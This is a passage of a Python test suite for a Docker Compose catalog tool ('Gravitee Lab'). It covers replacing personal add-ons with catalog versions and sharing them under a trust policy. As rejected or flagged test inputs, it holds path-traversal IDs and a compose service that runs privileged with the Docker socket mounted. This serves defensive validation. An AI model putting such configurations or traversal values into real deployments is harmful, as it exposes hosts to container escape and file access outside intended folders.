        with self.assertRaisesRegex(ValueError, "not in a catalog you have"):
            self.use()
        self.assertEqual([path for path in self.tree() if path.startswith(self.LOCAL)], [path for path in before if path.startswith(self.LOCAL)])
        for twin in ("local/echo", "../echo", "", None, 3, {"id": "x"}):
            self.units["addons"]["local/echo"]["twin"] = twin if isinstance(twin, dict) else {"id": twin}
            with self.subTest(twin=twin), self.assertRaises(ValueError):
                self.use()

    def test_only_what_belongs_to_this_machine(self):
        for uid in ("echo", "local/../echo", "@partner/ledger"):
            with self.subTest(uid=uid), self.assertRaisesRegex(ValueError, "Only your own add-ons can be replaced here"):
                self.use(uid)
        with self.assertRaises(paths.NotFound):
            self.use("local/gone")

    def test_a_run_that_stopped_is_run_again_and_finishes(self):
        def stop(label):
            if label == "rekey:starred":
                raise Crash()
        self.patch(moves, "STEP", stop)
        with self.assertRaises(Crash):
            self.use()
        self.assertTrue((self.root / self.LOCAL / "compose.yml").is_file(), "the personal copy is deleted last")
        self.assertEqual((self.root / self.THERE / ".env").read_text(), "TOKEN=1\n", "the settings had gone already")
        self.patch(moves, "STEP", None)
        self.assertEqual(self.use(), {"id": "echo"})
        self.assertFalse((self.root / self.LOCAL).exists())
        self.assertEqual(self.stars(), {"addon": ["echo", "kafka"]})
        self.assertEqual((self.root / self.THERE / ".env").read_text(), "TOKEN=1\n")

    def test_moved_alone_is_idempotent_and_leaves_the_personal_item_in_place(self):
        contribute.moved("addon", "local/echo", "echo")
        after = self.tree()
        contribute.moved("addon", "local/echo", "echo")
        self.assertEqual(self.tree(), after)
        self.assertTrue((self.root / self.LOCAL / "compose.yml").is_file())
        self.assertFalse((self.root / self.LOCAL / ".env").exists())
        self.assertEqual(self.stars(), {"addon": ["echo", "kafka"]})

    def test_moved_refuses_what_is_not_an_id_before_it_makes_a_path_of_it(self):
        before = self.tree()
        for old, new in (("echo", "x"), ("local/../x", "x"), ("local/echo", "local/x"), ("local/echo", "../x"),
                         ("local/echo", "@local/x"), ("local/echo", ""), ("local/echo", None), (3, "x")):
            with self.subTest(old=old, new=new), self.assertRaises(ValueError):
                contribute.moved("addon", old, new)
        with self.assertRaises(ValueError):
            contribute.moved("thing", "local/echo", "echo")
        self.assertEqual(self.tree(), before)

    def test_a_setup_has_no_settings_only_a_star_and_the_places_that_include_it(self):
        self.item("setup", "mine", "Mine", "include:\n  - ../../fixture/addons/echo/compose.yml\n",
                  twin={"id": "pair", "name": "Fixture catalog"})
        self.units["setups"]["pair"] = {**self.units["setups"]["local/mine"], "personal": False}
        self.item("playground", "uses", "Uses", "include:\n  - ../../setups/mine.yml\nservices: {}\n")
        self.write(".lab/starred.json", json.dumps({"setup": ["local/mine"]}))
        self.use("local/mine", "setup")
        self.assertFalse((self.root / ".lab/catalogs/local/setups/mine.yml").exists())
        self.assertEqual(self.stars(), {"setup": ["pair"]})
        self.assertEqual((self.root / ".lab/catalogs/local/playgrounds/uses/compose.yml").read_text(),
                         "include:\n  - ../../../fixture/setups/pair.yml\nservices: {}\n")

    def test_a_second_change_at_the_same_time_is_busy_and_nothing_moves(self):
        self.patch(registry, "FLOCK_WAIT", 0.2)
        held, free = threading.Event(), threading.Event()

        def hold():
            with registry.flock():
                held.set()
                free.wait(10)
        thread = threading.Thread(target=hold)
        thread.start()
        self.addCleanup(thread.join)
        self.addCleanup(free.set)
        held.wait(10)
        before = self.tree()
        with self.assertRaises(CatalogError) as raised:
            self.use()
        self.assertEqual(raised.exception.code, "busy")
        self.assertEqual(self.tree(), before)

    def test_files_that_cannot_be_deleted_are_told_after_the_settings_are_safe(self):
        self.patch(contribute.shutil, "rmtree", mock.Mock(side_effect=PermissionError("root owned")))
        with self.assertRaisesRegex(RuntimeError, "^Some files of Echo could not be deleted. Remove them by hand.$"):
            self.use()
        self.assertEqual((self.root / self.THERE / ".env").read_text(), "TOKEN=1\n")


class Real(Base):
    """Compose reads the fixtures and the copy is judged as the project judges a unit of a catalog (a visible skip without
    Compose 5): the reasons are the ones a consumer of the target is given."""

    PLAIN = "x-gravitee: {kind: addon, name: Plain, category: Other, description: Does nothing}\nservices:\n  plain-app:\n" \
            "    image: busybox:${PLAIN_APP_VERSION:-1.36}   # Image version\n    container_name: gio-plain-app\n" \
            "    labels:\n      io.gravitee.name: Plain\n      io.gravitee.description: Does nothing\n    networks: [internal]\n"

    def setUp(self):
        fixtures.need_compose()
        super().setUp()
        # The partner is a folder here: its units are listed by their folder, and a copy written there is a unit
        fixtures.install(self, "partner", "folder", audience="private")
        project.forget()
        self.patch(contribute, "_PROBES", {"x": (0, "yes")})

    def share(self, uid="local/scratch", to="fixture", kind="addon", check_only=True):
        return contribute.share(project.load(), kind, uid, to, check_only)

    def plain(self, text=None, slug="plain", readme="# Plain\n\nDoes nothing.\n"):
        self.write(f".lab/catalogs/local/addons/{slug}/compose.yml", text or self.PLAIN)
        if readme:
            self.write(f".lab/catalogs/local/addons/{slug}/README.md", readme)
        project.forget()
        return f"local/{slug}"

    @staticmethod
    def blocked(problems):
        """The lines of the trust policy, which are the reasons a consumer is given: the others are the rules of the author."""
        return [line for line in problems if line.startswith("Blocked: ")]

    def test_a_copy_the_policy_lets_run_has_nothing_to_fix(self):
        self.assertEqual(self.share()["problems"], [])
        self.assertEqual(self.share(self.plain(), "fixture")["problems"], [])
        self.assertEqual(self.share(self.plain(), "partner")["problems"], [])

    def test_the_reasons_are_the_ones_a_consumer_of_the_target_is_given(self):
        text = self.PLAIN.replace("    networks: [internal]\n", "    networks: [internal]\n    privileged: true\n    volumes:\n"
                                  "      - /var/run/docker.sock:/var/run/docker.sock\n      - ${PLAIN_APP_CONF:-./c}:/c\n")
        uid = self.plain(text)
        answer = self.share(uid, "partner")
        everything = answer["problems"]
        self.assertEqual(answer["renames"], [{"from": "PLAIN_APP_CONF", "to": "PARTNER_PLAIN_APP_CONF"}], "its own setting, named for the catalog")
        told = self.blocked(everything)
        self.assertTrue(told, everything)
        self.assertIn("plain-app: runs privileged, mounts the Docker socket: say why in x-gravitee.host_access (plain-app: <reason>), "
                      "so that it is read before it runs", everything, "what the author's rules say is there as well")
        # Written into the partner's folder the copy is a unit of it, and the project says the same
        copy = contribute._renamed(contribute.collect("addon", "plain", "partner"), "addon", "plain",
                                   {"PLAIN_APP_CONF": "PARTNER_PLAIN_APP_CONF"})
        for path, (mode, data) in copy.files.items():
            self.write(f".lab/catalogs/partner/{path}", data.decode())
        project.forget()
        seen = project.load()["addons"]["@partner/plain"]
        self.assertEqual([line[len("Blocked: "):] for line in told], seen["blocked"]["reasons"])

    def test_what_the_catalogs_own_check_finds_in_an_item_is_told_before_it_leaves(self):
        bad = ("x-gravitee: {kind: addon, name: Bad app, description: Does nothing}\nservices:\n  bad-app:\n    image: busybox:1.36\n"
               "    container_name: gio-bad-app\n    restart: always\n    networks: [internal]\n")
        uid = self.plain(bad, "bad", readme=None)
        said = ["x-gravitee.category is missing", "README.md is missing next to it: what it adds and how to use it",
                "bad-app: restart: always starts a stopped container again when Docker restarts: use unless-stopped",
                "bad-app: the label io.gravitee.description is missing"]
        for to in ("fixture", "partner"):
            with self.subTest(to):
                self.assertEqual(self.share(uid, to)["problems"], said)
        # The same lines, which are the ones `catalog.py check` and so the catalog's CI give the copy once it is there
        for path, (mode, data) in contribute.collect("addon", "bad", "partner").files.items():
            self.write(f".lab/catalogs/partner/{path}", data.decode())
        project.forget()
        found = [line for where, line in check.catalog_problems("partner") if where == "addons/bad/compose.yml"]
        self.assertEqual([line for line in said if line not in found], [], found)
        # Nothing leaves while one is told
        shutil.rmtree(self.root / ".lab/catalogs/partner/addons/bad")
        project.forget()
        with self.assertRaisesRegex(ValueError, "^x-gravitee.category is missing$"):
            self.share(uid, "partner", check_only=False)
        self.assertFalse((self.root / ".lab/catalogs/partner/addons/bad").exists())
        # A port published to the network is the policy's, as it is for a consumer
        loud = bad.replace("    restart: always\n", "    restart: unless-stopped\n    ports: [\"8999:80\"]\n")
        told = self.share(self.plain(loud, "loud"), "fixture")["problems"]
        self.assertIn("Blocked: Publishes a port to the network", told)

    def test_a_playground_whose_settings_are_not_its_catalogs_is_told_so_as_a_consumer_would_be(self):
        self.bank()
        file = self.root / ".lab/catalogs/local/playgrounds/bank/compose.yml"
        file.write_text(file.read_text().replace("fixture-shop", "bank"))
        project.forget()
        told = self.share("local/bank", "partner", "playground")["problems"]
        self.assertEqual(len(told), 1, told)
        self.assertRegex(told[0], r"^Blocked: Reads settings that are not its own: FIXTURE_SHOP_[A-Z_]+, ")
        copy = contribute.collect("playground", "bank", "partner")
        for path, (mode, data) in copy.files.items():
            self.write(f".lab/catalogs/partner/{path}", data.decode())
        project.forget()
        self.assertEqual([line[len("Blocked: "):] for line in told], project.load()["playgrounds"]["@partner/bank"]["blocked"]["reasons"])
        # The default catalog is the one whose settings those are
        self.assertEqual(self.share("local/bank", "fixture", "playground")["problems"], [])

    def written_into(self, ns, kind, slug, uid):
        """The copy for catalog `ns` written into its folder, where it is a unit: what the project then says of it."""
        for path, (mode, data) in contribute.collect(kind, slug, ns).files.items():
            self.write(f".lab/catalogs/{ns}/{path}", data.decode())
        project.forget()
        return project.load()[kind + "s"][uid]

    def test_a_name_another_unit_of_the_catalogs_before_holds_is_told_as_a_consumer_would_be(self):
        self.bank()   # the services of the Shop of the default catalog, under the settings of the partner
        for name in ("compose.yml", "seed/apim/apis/shop.json"):
            file = self.root / ".lab/catalogs/local/playgrounds/bank" / name
            file.write_text(file.read_text().replace("FIXTURE_SHOP_", "PARTNER_"))
        project.forget()
        told = self.share("local/bank", "partner", "playground")["problems"]
        self.assertEqual(told, ["Blocked: Same name as Shop"])
        seen = self.written_into("partner", "playground", "bank", "@partner/bank")
        self.assertEqual([line[len("Blocked: "):] for line in told], seen["blocked"]["reasons"])
        # In the default catalog itself the names are its own to hold: it claims first
        self.assertEqual([line for line in self.share("local/bank", "fixture", "playground")["problems"] if "Same name" in line], [])

    def test_a_private_unit_under_a_public_catalog_is_told_as_a_consumer_would_be(self):
        fixtures.install(self, "fixture", "folder", audience="public")   # public, and it declares the private partner
        uid = self.plain("x-gravitee: {kind: addon, name: Ledgered, category: Other, description: Uses a ledger}\ninclude:\n"
                         "  - ../../../partner/addons/ledger/compose.yml\nservices: {}\n", "ledgered")
        project.forget()
        told = self.share(uid, "fixture")["problems"]
        self.assertEqual(told, ["Blocked: Depends on private content"])
        self.assertEqual(self.written_into("fixture", "addon", "ledgered", "ledgered")["blocked"]["reasons"], ["Depends on private content"])
        self.assertEqual(self.share(uid, "partner")["problems"], [], "a private catalog may depend on private content")

    def test_an_included_unit_that_is_blocked_blocks_the_copy_as_it_would_a_consumer(self):
        fixtures.install(self, "fixture", "folder", audience="public")
        uid = self.plain("x-gravitee: {kind: addon, name: Futurist, category: Other, description: Needs a Lab that does not exist}\n"
                         "include:\n  - ../../../fixture/addons/future/compose.yml\nservices: {}\n", "futurist")
        project.forget()
        told = self.share(uid, "fixture")["problems"]
        self.assertEqual(len(told), 1, told)
        self.assertRegex(told[0], r"^Blocked: Needs .*, which is blocked$")
        self.assertEqual([line[len("Blocked: "):] for line in told],
                         self.written_into("fixture", "addon", "futurist", "futurist")["blocked"]["reasons"])

    def test_a_setting_the_seed_reads_is_judged_like_one_the_compose_file_reads(self):
        self.bank(**{"seed/apim/apis/extra.json": '{"name": "${NOT_PARTNERS_SETTING}", "id": "${PARTNER_FINE:-x}"}'})
        file = self.root / ".lab/catalogs/local/playgrounds/bank/compose.yml"
        file.write_text(file.read_text().replace("fixture-shop", "bank").replace("FIXTURE_SHOP_", "PARTNER_"))   # the settings of the partner
        project.forget()
        told = self.share("local/bank", "partner", "playground")["problems"]
        self.assertEqual(len(told), 1, told)
        self.assertRegex(told[0], r"^Blocked: Reads settings that are not its own: .*NOT_PARTNERS_SETTING")
        self.assertNotIn("PARTNER_FINE", told[0], "a setting of the partner's own is its own, in a seed as in a compose file")
        copy = contribute.collect("playground", "bank", "partner")
        for path, (mode, data) in copy.files.items():
            self.write(f".lab/catalogs/partner/{path}", data.decode())
        project.forget()
        self.assertEqual([line[len("Blocked: "):] for line in told], project.load()["playgrounds"]["@partner/bank"]["blocked"]["reasons"])

    def test_a_path_at_the_wrong_depth_is_a_reason_a_consumer_would_be_given(self):
        self.bank()
        file = self.root / ".lab/catalogs/local/playgrounds/bank/compose.yml"
        text = file.read_text().replace("fixture-shop", "bank")
        for label, wrong, said in (("the seeder three folders short", text.replace("build: ../../../../../seeder", "build: ../../../../seeder"),
                                    "Builds from outside its folder"),
                                   ("a bind one folder short", text.replace("./seed:/seed:ro", "../../../../plugins/apim:/p"),
                                    "Mounts files outside its folder")):
            with self.subTest(label):
                file.write_text(wrong)
                project.forget()
                self.assertEqual(self.blocked(self.share("local/bank", "fixture", "playground")["problems"]), [f"Blocked: {said}"])
        file.write_text(text.replace("./seed:/seed:ro", "../../../../../plugins/apim:/p"))   # where the plugins of a product are
        project.forget()
        self.assertEqual(self.share("local/bank", "fixture", "playground")["problems"], [])

    def test_a_compose_file_that_does_not_load_is_a_problem_that_names_no_copy(self):
        uid = self.plain("x-gravitee: {kind: addon, name: Plain}\nservices:\n  plain-app:\n    image: busybox\n    depends_on: [nope]\n")
        told = [line for line in self.share(uid, "fixture")["problems"] if not line.startswith(("x-gravitee.", "plain-app:"))]
        self.assertEqual(len(told), 1, told)
        self.assertRegex(told[0], r"^Does not load with the platform: .*nope")
        self.assertNotIn("stage-share", told[0])
        self.assertNotIn(str(self.root), told[0])
        self.assertEqual(self.stages(), [])

    def test_the_project_the_page_reads_never_sees_the_copy(self):
        seen = []

        def judge(*args):
            project.forget()
            seen.append(sorted(project.load()["addons"]))
            return []
        self.patch(contribute, "_judged", judge)
        before = sorted(project.load()["addons"])
        self.share()
        self.assertEqual(seen, [before])

    def test_a_repository_that_says_it_takes_no_contributions_is_read_with_compose(self):
        text = (fixtures.CATALOGS / "partner" / "catalog.yml").read_text().replace("  license:", "  contribute: none\n  license:")
        fixtures.install(self, "partner", "git", files={"catalog.yml": text}, store=True)
        project.forget()
        self.assertEqual({one["id"]: one["reason"] for one in contribute.destinations(project.load(), "addon", "local/scratch")}["partner"],
                         "Partner fixture does not take contributions from the Lab.")
        with self.assertRaises(CatalogError) as raised:
            self.share(self.plain(), "partner")
        self.assertEqual(raised.exception.code, "contribute_none")

    def test_a_full_share_with_the_judgement_of_the_project(self):
        self.bank()
        file = self.root / ".lab/catalogs/local/playgrounds/bank/compose.yml"
        file.write_text(file.read_text().replace("fixture-shop", "bank"))
        project.forget()
        done = self.share("local/bank", "fixture", "playground", False)
        self.assertEqual(done["branch"], f"lab/bank-{DAY}")
        self.assertIn("playgrounds/bank/seed/apim/apis/shop.json", self.remote("fixture").git("ls-tree", "-r", "--name-only", done["branch"]))

    def test_a_playground_that_declares_no_set_is_shared_with_the_versions_it_ran_on(self):
        self.bank()
        file = self.root / ".lab/catalogs/local/playgrounds/bank/compose.yml"
        declared = "  tested:\n    - APIM_VERSION: \"4.12.0\"\n"
        self.assertIn(declared, file.read_text())
        file.write_text(file.read_text().replace("fixture-shop", "bank").replace(declared, ""))
        self.write(".lab/tested.json", json.dumps({"local/bank": [{"versions": {"APIM_VERSION": "4.12.1"}, "images": {}, "at": "x"}]}))
        project.forget()
        self.assertEqual(self.share("local/bank", "fixture", "playground", True)["changes"], ["compose.yml"])
        done = self.share("local/bank", "fixture", "playground", False)
        shared = self.remote("fixture").git("show", f"{done['branch']}:playgrounds/bank/compose.yml")
        self.assertIn("  tested:\n    - APIM_VERSION: \"4.12.1\"\n", shared)
        self.assertNotIn("tested", file.read_text(), "the personal file is left as it was")

    def test_the_catalogs_version_replaces_the_personal_one_that_the_project_calls_its_twin(self):
        uid = self.plain()
        self.write(".lab/catalogs/local/addons/plain/.env", "PLAIN=1\n")
        self.write(".lab/starred.json", json.dumps({"addon": [uid]}))
        self.write(".lab/catalogs/partner/addons/plain/compose.yml", self.PLAIN)
        project.forget()
        built = project.load()
        self.assertEqual(built["addons"][uid]["twin"], {"id": "@partner/plain", "name": "Partner fixture"})
        self.assertEqual(built["addons"]["@partner/plain"]["twin"], {"id": uid, "name": "Personal"})
        self.assertEqual(contribute.use_catalog_version(built, "addon", uid), {"id": "@partner/plain"})
        self.assertFalse((self.root / ".lab/catalogs/local/addons/plain").exists())
        self.assertEqual((self.root / ".lab/catalogs/partner/addons/plain/.env").read_text(), "PLAIN=1\n")
        self.assertEqual(json.loads((self.root / ".lab/starred.json").read_text()), {"addon": ["@partner/plain"]})
        project.forget()
        self.assertNotIn(uid, project.load()["addons"])
        self.assertIsNone(project.load()["addons"]["@partner/plain"]["twin"])

    def test_the_twin_is_held_by_the_project_as_the_policy_of_the_start_says(self):
        uid = self.plain()
        self.write(".lab/catalogs/partner/addons/plain/compose.yml", self.PLAIN)
        self.write(paths.ON_FILE, "include:\n  - .lab/catalogs/partner/addons/plain/compose.yml\n")
        project.forget()
        with self.assertRaises(CatalogError) as raised:
            contribute.use_catalog_version(project.load(), "addon", uid)
        self.assertEqual(lines_of(raised.exception), ("held", 409, "Turn off Plain first."))


if __name__ == "__main__":
    unittest.main()


class LegacyLab(unittest.TestCase):
    """A share keeps the `lab` that older Gravitee Labs read true: it raises one the shared item needs more than, in the
    same commit or copy, and never lowers it or adds the lines to a catalog that does without them."""

    def test_a_lab_lower_than_the_item_needs_is_raised_alone(self):
        text = "x-gravitee-catalog:\n  schema: 1\n  id: hub\n  version: 1.0.0\n  lab: 1   # older Labs\n"
        self.assertEqual(contribute._raised(text, 3), text.replace("lab: 1", "lab: 3"))

    def test_a_lab_that_is_enough_or_absent_is_left_as_it_is(self):
        text = "x-gravitee-catalog:\n  id: hub\n  version: 1.0.0\n  lab: 4\n"
        self.assertIsNone(contribute._raised(text, 3))
        self.assertIsNone(contribute._raised(text, 4))
        self.assertIsNone(contribute._raised(text.replace("  lab: 4\n", ""), 3), "a catalog without the lines keeps without them")
